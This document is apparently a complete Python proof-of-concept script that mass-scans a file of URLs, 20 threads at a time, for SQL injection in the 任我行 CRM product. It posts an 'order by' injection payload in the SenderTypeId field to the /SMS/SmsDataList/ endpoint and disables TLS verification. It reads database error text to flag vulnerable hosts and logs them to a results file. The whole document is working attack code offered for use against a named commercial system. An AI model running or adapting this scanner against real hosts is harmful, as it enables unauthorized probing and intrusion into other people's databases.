"""
任我行CRMSQL注入 poc
"""
import argparse, sys, requests
from multiprocessing.dummy import Pool
from rich.console import Console
import textwrap
from functools import partial
import json

requests.packages.urllib3.disable_warnings()
console = Console()

text = """



 ██████╗██████╗ ███╗   ███╗        ██████╗  ██████╗  ██████╗
██╔════╝██╔══██╗████╗ ████║        ██╔══██╗██╔═══██╗██╔════╝
██║     ██████╔╝██╔████╔██║        ██████╔╝██║   ██║██║     
██║     ██╔══██╗██║╚██╔╝██║        ██╔═══╝ ██║   ██║██║     
╚██████╗██║  ██║██║ ╚═╝ ██║███████╗██║     ╚██████╔╝╚██████╗
 ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝      ╚═════╝  ╚═════╝
                                                            
 


                                                                           @version:1.0.0
                                                                           @author:zt-byte        

    """


def current(text):
    console.print(f"[+]{text} 存在漏洞", style="bold green")


def ban(text):
    console.print(text, style="bold red")
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Chrome/83.0.4103.116 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
data = {"Keywords": '', "StartSendDate": "2023-08-10", "EndSendDate": "2023-09-1", "SenderTypeId": "-0000000000'order by 2-- "}


def poc(url, outfile):
    url_new = url + "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    try:
        response = requests.post(url_new, headers=headers, data=data, verify=False,timeout=4)
        dict = json.loads(response.text)
        if "ORDER BY 位置号" in dict["error"]["message"]:
            current(url)
            with open(f"{outfile}", 'a', encoding="utf-8") as f:
                f.write(url_new + "\n")
        else:
            print(url + "不存在漏洞")
    except:
        pass


def Read_File(infile):
    list = []
    with open(f"{infile}", "r", encoding="utf-8") as f:
        result = f.readlines()

        for ip in result:
            ip = ip.strip("\n")
            list.append(ip)
    return list


if __name__ == '__main__':
    ban(text)
    parser = argparse.ArgumentParser(description='任我行CRMSQL注入poc',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent(
                                         '''example:  python poc.py -f ip.txt -o result.txt'''))
    parser.add_argument("-f", "--file", dest="file", type=str, help="要查询的url文件，example:urls.txt")
    parser.add_argument("-o", "--output", dest="result", type=str, default="result.txt",
                        help="结果的保存位置 ,default=result.txt example: result.txt")
    args = parser.parse_args()

    url_list = Read_File(args.file)


    pool = Pool(20)  # 20自己指定的线程数
    partial_printNumber = partial(poc, outfile=args.result)
    pool.map(partial_printNumber, url_list)  # 调用进程池的map方法
    pool.close()  # 关闭进程池，禁止提交新的任务
    pool.join()
